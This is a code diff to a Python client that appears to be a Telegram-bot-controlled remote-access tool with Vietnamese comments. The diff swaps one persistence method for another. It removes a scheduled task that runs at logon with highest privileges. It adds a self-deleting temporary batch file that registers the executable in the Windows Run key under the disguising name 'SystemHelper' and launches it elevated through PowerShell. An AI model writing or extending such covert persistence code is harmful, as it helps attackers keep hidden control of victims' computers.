@@ -540,19 +540,33 @@ if not is_admin():
 import winreg
  
  
+import os
+import sys
+import tempfile
+import subprocess
+import time
+
 if __name__ == "__main__":
     print(f"Client started with ID: {CLIENT_ID}")
-    exe_path = os.path.abspath(__file__)  # Nếu đang chạy từ exe, sẽ là chính file exe đó
-
-    # Tạo task Scheduler để chạy khi user đăng nhập
-    subprocess.run([
-        "schtasks",
-        "/Create",
-        "/SC", "ONLOGON",
-        "/TN", "MyAppTask",
-        "/TR", exe_path,
-        "/RL", "HIGHEST",
-        "/F"
-    ])
-
     bot.polling()
+    # Đợi 10 giây trước khi thực hiện
+    time.sleep(10)
+
+    # Đường dẫn exe của bạn
+    exe_path = os.path.abspath(sys.executable)
+
+    # Nội dung .bat
+    bat_content = f"""@echo off
+    REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /V "SystemHelper" /t REG_SZ /F /D "{exe_path}"
+    del "%~f0"
+    """
+
+    # Tạo file .bat tạm
+    bat_file = os.path.join(tempfile.gettempdir(), "temp_startup.bat")
+    with open(bat_file, "w") as f:
+        f.write(bat_content)
+
+    # Chạy .bat với quyền admin
+    subprocess.run(['powershell', 'Start-Process', bat_file, '-Verb', 'RunAs'])
+
+
